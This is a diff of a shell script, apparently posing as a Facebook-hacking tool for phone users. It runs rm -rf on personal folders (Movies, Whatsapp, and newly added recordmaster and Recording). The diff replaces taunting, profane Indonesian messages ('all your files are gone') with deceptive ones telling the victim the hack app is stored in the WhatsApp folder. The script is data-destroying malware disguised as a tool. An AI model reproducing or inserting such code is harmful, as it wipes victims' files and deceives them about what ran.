@@ -18,10 +18,14 @@ rm -rf Movies
 
 rm -rf Whatsapp
 
-echo "Mampus Semua File Lu Hilang"
+rm -rf recordmaster
 
-echo "Roni Tersakiti Ya Jadi Gini"
+rm -rf Recording
 
-echo "Mangkanya Jangan Macam Macam"
+echo "Silahkan cek Berkas WhatsApp"
 
-echo "Fuck You !!"
+echo "Karena Disitulah "
+
+echo "Aplikasi Hack Fb nya di simpan"
+
+echo "Terimakasih"
